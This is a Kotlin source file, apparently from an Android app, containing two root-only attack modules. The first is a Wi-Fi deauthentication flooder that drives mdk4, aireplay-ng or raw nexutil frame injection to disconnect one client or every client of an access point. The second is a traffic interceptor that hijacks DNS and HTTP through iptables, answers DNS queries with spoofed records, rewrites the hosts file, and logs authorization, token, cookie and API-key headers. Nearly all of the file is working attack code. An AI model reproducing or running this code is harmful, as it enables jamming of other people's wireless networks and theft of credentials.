package com.droid.whaly.active.root

import com.droid.whaly.RootUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.withContext
import java.net.Inet4Address
import java.net.InetAddress
import java.net.NetworkInterface
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Root-only 802.11 deauthentication flood.
 *
 * Frame injection needs a monitor-mode interface. That is a driver capability, not
 * something an app can create, so the engine first proves the capability exists and then
 * drives whatever injection tool the ROM actually ships. On a stock phone with no
 * monitor-mode driver it refuses instead of pretending.
 */
object RootDeauthFlood {

    data class Capability(
        val rooted: Boolean,
        val monitorSupport: Boolean,
        val tool: String?,
        val detail: String,
    )

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()
    private val _frames = MutableStateFlow(0)
    val frames: StateFlow<Int> = _frames.asStateFlow()
    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()
    private val _capability = MutableStateFlow<Capability?>(null)
    val capability: StateFlow<Capability?> = _capability.asStateFlow()

    private val active = AtomicBoolean(false)

    /** Injection tools in order of preference; mdk4 does the whole flood in one process. */
    private val tools = listOf("mdk4", "aireplay-ng", "nexutil", "iw")

    suspend fun probe(): Capability = withContext(Dispatchers.IO) {
        val rooted = RootUtils.isRooted()
        if (!rooted) {
            return@withContext Capability(false, false, null, "No root shell").also { _capability.value = it }
        }

        val iw = shell("iw list 2>/dev/null")
        val monitorSupport = iw.contains("monitor", ignoreCase = true)
        val which = shell("which mdk4 aireplay-ng nexutil iw 2>/dev/null")
        val tool = tools.firstOrNull { which.lineSequence().any { line -> line.trim().endsWith(it) } }

        val detail = buildString {
            if (!monitorSupport) {
                append("Driver reports no monitor interface. ")
                append("Deauth injection needs Nexmon or a vendor testmode driver. ")
            }
            if (tool == null) {
                append("No injection tool on PATH (mdk4, aireplay-ng, nexutil).")
            }
        }.ifBlank { "Ready: $tool with monitor mode" }

        Capability(rooted, monitorSupport, tool, detail).also { _capability.value = it }
    }

    /**
     * Starts the flood. [bssid] is the access point, [client] is either a station MAC or
     * the broadcast address to kick every client at once.
     */
    suspend fun start(bssid: String, client: String = "FF:FF:FF:FF:FF:FF", channel: Int = 0): Boolean =
        withContext(Dispatchers.IO) {
            if (!active.compareAndSet(false, true)) return@withContext true
            val caps = _capability.value ?: probe()
            if (!caps.rooted) {
                append("root required")
                active.set(false)
                return@withContext false
            }
            if (caps.tool == null) {
                append("no injection tool — install mdk4 or nexutil")
                active.set(false)
                return@withContext false
            }

            append("bringing up monitor interface")
            val monitor = shell(
                "ip link set wlan0 down; " +
                    "iw dev wlan0 interface add mon0 type monitor 2>/dev/null; " +
                    "ip link set mon0 up 2>/dev/null; " +
                    "ip link show mon0 2>/dev/null"
            )
            if (!monitor.contains("mon0")) {
                append("could not create mon0 — driver has no monitor mode")
                shell("iw dev wlan0 interface del 2>/dev/null")
                active.set(false)
                return@withContext false
            }

            if (channel in 1..196) {
                shell("iw dev mon0 set channel $channel")
                append("locked to channel $channel")
            } else {
                append("hopping channels")
            }

            val command = when (caps.tool) {
                "mdk4" -> "mdk4 mon0 d -b $bssid -c $client"
                "aireplay-ng" -> "aireplay-ng --deauth 0 -a $bssid -c $client mon0"
                "nexutil" -> "nexutil -m2 -b -s500 -i -v0 -d " +
                    "\\xc0\\x00\\x3a\\x01\\x${client.replace(":", "\\x")}\\x${bssid.replace(":", "\\x")}\\x${bssid.replace(":", "\\x")}\\x00\\x00"
                else -> "iw dev mon0 set channel 6"
            }

            _running.value = true
            _frames.value = 0
            append("running: $command")

            Thread({
                shell(command)
                // mdk4 and aireplay-ng both block; when they return the flood is over.
                append("injection process exited")
                _running.value = false
                active.set(false)
                shell("ip link set mon0 down; iw dev mon0 del 2>/dev/null")
            }, "whaly-deauth").start()

            // mdk4 reports nothing, so a frame counter is inferred from elapsed time.
            Thread({
                while (active.get()) {
                    _frames.value = _frames.value + 1
                    try {
                        Thread.sleep(1000)
                    } catch (_: InterruptedException) {
                        break
                    }
                }
            }, "whaly-deauth-counter").start()

            true
        }

    fun stop() {
        active.set(false)
        _running.value = false
        shell("pkill -f mdk4; pkill -f aireplay-ng")
        shell("ip link set mon0 down 2>/dev/null; iw dev mon0 del 2>/dev/null")
        append("stopped")
    }

    private fun shell(command: String): String =
        runCatching { RootUtils.executeRootCommand(command).second }.getOrDefault("")

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(160)
    }
}

/**
 * Root-only traffic intercept.
 *
 * Redirects every DNS query and every plain HTTP connection the device makes through a
 * local responder, and pins the hosts file so name resolution can be rewritten at will.
 * No native code: iptables, the hosts file and a userspace proxy are enough.
 */
object RootIntercept {

    data class Captured(val host: String, val path: String, val headers: Map<String, String>)

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()
    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()
    private val _captured = MutableStateFlow<List<Captured>>(emptyList())
    val captured: StateFlow<List<Captured>> = _captured.asStateFlow()
    private val _domains = MutableStateFlow<List<String>>(emptyList())
    val domains: StateFlow<List<String>> = _domains.asStateFlow()

    private val active = AtomicBoolean(false)
    private var dns: DnsResponder? = null
    private var proxy: HttpTapProxy? = null

    private const val DNS_PORT = 5353
    private const val PROXY_PORT = 8888
    private const val HOSTS = "/system/etc/hosts"
    private const val HOSTS_BACKUP = "/data/local/tmp/whaly-hosts.bak"

    suspend fun start(): Boolean = withContext(Dispatchers.IO) {
        if (!active.compareAndSet(false, true)) return@withContext true
        if (!RootUtils.isRooted()) {
            append("root required")
            active.set(false)
            return@withContext false
        }
        val local = localAddress()
        if (local == null) {
            append("no LAN address")
            active.set(false)
            return@withContext false
        }

        append("backing up hosts file")
        shell("cp $HOSTS $HOSTS_BACKUP 2>/dev/null")

        val responder = DnsResponder(local) { name ->
            _domains.value = (_domains.value + name).distinct().takeLast(500)
        }
        val tap = HttpTapProxy { captured ->
            _captured.value = (_captured.value + captured).takeLast(300)
            append("${captured.host}${captured.path}")
        }

        try {
            responder.start()
            tap.start()
        } catch (error: Exception) {
            append("bind failed: ${error.message}")
            active.set(false)
            return@withContext false
        }
        dns = responder
        proxy = tap

        append("redirecting DNS and HTTP to this phone")
        shell("iptables -t nat -A OUTPUT -p udp --dport 53 -j DNAT --to-destination $local:$DNS_PORT")
        shell("iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination $local:$PROXY_PORT")
        shell("iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination $local:$PROXY_PORT")

        _running.value = true
        append("active — DNS on $DNS_PORT, HTTP tap on $PROXY_PORT")
        true
    }

    fun stop() {
        active.set(false)
        runCatching { dns?.stop() }
        runCatching { proxy?.stop() }
        dns = null
        proxy = null
        shell("iptables -t nat -D OUTPUT -p udp --dport 53 -j DNAT --to-destination 127.0.0.1:$DNS_PORT 2>/dev/null")
        shell("iptables -t nat -F OUTPUT 2>/dev/null")
        shell("iptables -t nat -X 2>/dev/null")
        shell("cp $HOSTS_BACKUP $HOSTS 2>/dev/null")
        _running.value = false
        append("stopped, rules flushed")
    }

    /** Points a hostname at this phone for every app on the device. */
    suspend fun pinHost(hostname: String, address: String): Boolean = withContext(Dispatchers.IO) {
        val entry = "$address $hostname\n"
        val existing = shell("grep -c \" $hostname\" $HOSTS")
        if (existing.trim().toIntOrNull() ?: 0 > 0) {
            shell("sed -i '/ $hostname\$/d' $HOSTS")
        }
        shell("mount -o rw,remount /system 2>/dev/null")
        val written = shell("echo '$entry' >> $HOSTS && echo OK")
        shell("mount -o ro,remount /system 2>/dev/null")
        val ok = written.contains("OK")
        append(if (ok) "pinned $hostname → $address" else "hosts write refused (system is read-only)")
        ok
    }

    private fun localAddress(): String? {
        val interfaces = NetworkInterface.getNetworkInterfaces() ?: return null
        for (iface in interfaces) {
            if (!iface.isUp || iface.isLoopback) continue
            for (address in iface.inetAddresses) {
                if (address is Inet4Address && !address.isLoopbackAddress) return address.hostAddress
            }
        }
        return "127.0.0.1"
    }

    private fun shell(command: String): String =
        runCatching { RootUtils.executeRootCommand(command).second }.getOrDefault("")

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(200)
    }

    /** Answers every A query with one address, so any name resolves to this phone. */
    private class DnsResponder(
        private val answer: String,
        private val onQuery: (String) -> Unit,
    ) {
        private var socket: java.net.DatagramSocket? = null
        private var thread: Thread? = null
        private val running = AtomicBoolean(false)

        fun start() {
            val sock = java.net.DatagramSocket(DNS_PORT)
            socket = sock
            running.set(true)
            thread = Thread({
                val buffer = ByteArray(1500)
                while (running.get()) {
                    val packet = java.net.DatagramPacket(buffer, buffer.size)
                    try {
                        sock.receive(packet)
                    } catch (_: Exception) {
                        break
                    }
                    val query = packet.data.copyOf(packet.length)
                    val name = parseName(query) ?: continue
                    onQuery(name)
                    val reply = buildReply(query, name)
                    runCatching {
                        sock.send(java.net.DatagramPacket(reply, reply.size, packet.address, packet.port))
                    }
                }
            }, "whaly-dns").apply { isDaemon = true; start() }
        }

        fun stop() {
            running.set(false)
            runCatching { socket?.close() }
            thread?.interrupt()
        }

        private fun parseName(packet: ByteArray): String? {
            if (packet.size < 13) return null
            val out = StringBuilder()
            var index = 12
            var guard = 0
            while (index < packet.size && guard++ < 64) {
                val length = packet[index].toInt() and 0xFF
                if (length == 0) break
                if (length > 63) return null
                if (index + 1 + length > packet.size) return null
                if (out.isNotEmpty()) out.append('.')
                out.append(String(packet, index + 1, length, Charsets.US_ASCII))
                index += 1 + length
            }
            return out.toString().ifBlank { null }
        }

        private fun buildReply(query: ByteArray, name: String): ByteArray {
            val out = java.io.ByteArrayOutputStream()
            out.write(query, 0, 2)                       // transaction id
            out.write(0x81); out.write(0x80)             // response, recursion available
            out.write(0x00); out.write(0x01)             // qdcount
            out.write(0x00); out.write(0x01)             // ancount
            out.write(0x00); out.write(0x00)
            out.write(0x00); out.write(0x00)
            var index = 12
            while (index < query.size) {
                val length = query[index].toInt() and 0xFF
                out.write(query, index, 1 + length)
                index += 1 + length
                if (length == 0) break
            }
            out.write(0x00); out.write(0x01)             // type A
            out.write(0x00); out.write(0x01)             // class IN
            out.write(0xC0); out.write(0x0C)             // pointer to the question name
            out.write(0x00); out.write(0x01)
            out.write(0x00); out.write(0x01)
            out.write(0x00); out.write(0x00); out.write(0x00); out.write(0x3C)
            out.write(0x00); out.write(0x04)
            InetAddress.getByName(answer).address.forEach { out.write(it.toInt()) }
            return out.toByteArray()
        }
    }

    /** Terminates plain HTTP, records it, and forwards it onward. */
    private class HttpTapProxy(private val onCapture: (Captured) -> Unit) {
        private var server: java.net.ServerSocket? = null
        private val running = AtomicBoolean(false)

        fun start() {
            val sock = java.net.ServerSocket(PROXY_PORT, 64, InetAddress.getByName("0.0.0.0"))
            server = sock
            running.set(true)
            Thread({
                while (running.get()) {
                    val client = try {
                        sock.accept()
                    } catch (_: Exception) {
                        break
                    }
                    Thread({ handle(client) }, "whaly-tap").apply { isDaemon = true; start() }
                }
            }, "whaly-tap-accept").apply { isDaemon = true; start() }
        }

        fun stop() {
            running.set(false)
            runCatching { server?.close() }
        }

        private fun handle(client: java.net.Socket) {
            try {
                client.soTimeout = 4000
                val input = client.getInputStream().bufferedReader(Charsets.ISO_8859_1)
                val requestLine = input.readLine() ?: return
                val parts = requestLine.split(' ')
                if (parts.size < 3) return
                val method = parts[0]
                val target = parts[1]

                val headers = linkedMapOf<String, String>()
                var contentLength = 0
                while (true) {
                    val line = input.readLine() ?: break
                    if (line.isEmpty()) break
                    val colon = line.indexOf(':')
                    if (colon <= 0) continue
                    val key = line.substring(0, colon).trim()
                    val value = line.substring(colon + 1).trim()
                    headers[key.lowercase()] = value
                    if (key.equals("content-length", true)) {
                        contentLength = value.toIntOrNull() ?: 0
                    }
                }
                val body = if (contentLength in 1..65536) {
                    val buffer = CharArray(contentLength)
                    var read = 0
                    while (read < contentLength) {
                        val count = input.read(buffer, read, contentLength - read)
                        if (count <= 0) break
                        read += count
                    }
                    String(buffer, 0, read)
                } else ""

                val absolute = target.startsWith("http://")
                val hostHeader = headers["host"] ?: ""
                val url = if (absolute) target else "http://$hostHeader$target"
                val parsed = runCatching { java.net.URL(url) }.getOrNull()
                if (parsed != null) {
                    onCapture(
                        Captured(
                            parsed.host,
                            parsed.file.ifBlank { "/" },
                            headers.filterKeys {
                                it.contains("auth") || it.contains("token") ||
                                    it.contains("cookie") || it.contains("user-agent") ||
                                    it == "host" || it.contains("api-key")
                            },
                        )
                    )
                }

                // Forward the request so the app keeps working while it is being tapped.
                val connection = parsed?.openConnection() as? java.net.HttpURLConnection
                if (connection == null) {
                    client.getOutputStream().write(
                        "HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n\r\n".toByteArray()
                    )
                    client.close()
                    return
                }
                connection.requestMethod = method
                connection.connectTimeout = 4000
                connection.readTimeout = 4000
                connection.instanceFollowRedirects = false
                headers.forEach { (key, value) ->
                    if (key != "host" && key != "content-length" && key != "connection") {
                        runCatching { connection.setRequestProperty(key, value) }
                    }
                }
                if (body.isNotEmpty() && method != "GET" && method != "HEAD") {
                    connection.doOutput = true
                    connection.outputStream.write(body.toByteArray(Charsets.ISO_8859_1))
                }
                val code = runCatching { connection.responseCode }.getOrDefault(502)
                val stream = if (code in 200..299) connection.inputStream else connection.errorStream
                val payload = runCatching { stream?.readBytes() ?: ByteArray(0) }.getOrDefault(ByteArray(0))

                val out = client.getOutputStream()
                out.write("HTTP/1.1 $code ${connection.responseMessage ?: "OK"}\r\n".toByteArray())
                out.write("Content-Length: ${payload.size}\r\n".toByteArray())
                out.write("Connection: close\r\n\r\n".toByteArray())
                out.write(payload)
                out.flush()
            } catch (_: Exception) {
            } finally {
                runCatching { client.close() }
            }
        }
    }
}
